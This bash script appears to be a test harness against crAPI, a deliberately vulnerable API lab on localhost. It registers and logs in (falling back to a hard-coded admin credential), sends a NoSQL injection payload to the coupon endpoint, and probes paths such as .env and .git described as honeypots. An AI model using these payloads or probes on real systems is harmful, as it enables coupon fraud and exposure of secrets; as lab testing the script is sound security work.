#!/bin/bash
# crAPI Native Exploits: register, login, BOLA, coupon abuse
# These go through crAPI's actual backend services

BASE="http://localhost:8888"
LOG="test_logs/crapi_native.log"
> "$LOG"

echo "=== crAPI Native Exploit Tests ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# --- Setup: Register a user ---
echo "--- Setup: Register test user ---" | tee -a "$LOG"
REG_RESP=$(curl -s -X POST "$BASE/identity/api/auth/signup" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test Attacker",
    "email": "attacker@test.com",
    "password": "Passw0rd!",
    "number": "1234567890"
  }')
echo "$REG_RESP" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# --- Login ---
echo "--- Login as test user ---" | tee -a "$LOG"
LOGIN_RESP=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Passw0rd!"}')
echo "$LOGIN_RESP" | tee -a "$LOG"
echo "" | tee -a "$LOG"

TOKEN=$(echo "$LOGIN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token','NO_TOKEN'))" 2>/dev/null)
echo "Auth token: ${TOKEN:0:50}..." | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

if [ "$TOKEN" = "NO_TOKEN" ]; then
  echo "!!! Login failed, trying with pre-seeded user admin@example.com / Admin!123 ---" | tee -a "$LOG"
  LOGIN_RESP=$(curl -s -X POST "$BASE/identity/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@example.com","password":"Admin!123"}')
  echo "$LOGIN_RESP" | tee -a "$LOG"
  echo "" | tee -a "$LOG"
  TOKEN=$(echo "$LOGIN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token','NO_TOKEN'))" 2>/dev/null)
  echo "Auth token: ${TOKEN:0:50}..." | tee -a "$LOG"
  echo -e "\n" | tee -a "$LOG"
fi

# --- Test: BOLA on vehicle location ---
echo "--- Test: BOLA - enumerate vehicle locations ---" | tee -a "$LOG"
echo "  (Trying common UUIDs to find other users' vehicles)" | tee -a "$LOG"

# First get our own dashboard to find a vehicle ID
echo "  Getting own dashboard..." | tee -a "$LOG"
DASH=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/identity/api/v2/user/dashboard")
echo "$DASH" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# --- Test: Access other users' data ---
echo "--- Test: Access user list (data exposure) ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/identity/api/v2/user/dashboard" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# --- Test: Community posts ---
echo "--- Test: Community forum access ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/community/api/v2/community/posts/recent" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# --- Test: Workshop products ---
echo "--- Test: Workshop products ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/workshop/api/shop/products" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# --- Test: Coupon endpoint (injection target) ---
echo "--- Test: Coupon validation (normal) ---" | tee -a "$LOG"
curl -s -X POST "$BASE/workshop/api/shop/apply_coupon" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":"TEST123"}' | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

echo "--- Test: Coupon validation (NoSQL injection attempt) ---" | tee -a "$LOG"
curl -s -X POST "$BASE/workshop/api/shop/apply_coupon" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":{"$ne":"invalid"}}' | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# --- Test: Honeypot endpoints ---
echo "--- Test: Honeypot endpoint (.env) ---" | tee -a "$LOG"
curl -s "$BASE/.env" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

echo "--- Test: Honeypot endpoint (.git) ---" | tee -a "$LOG"
curl -s "$BASE/.git" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

echo "--- Test: Honeypot endpoint (admin/debug) ---" | tee -a "$LOG"
curl -s "$BASE/admin/debug" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

echo "=== crAPI Native Tests Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
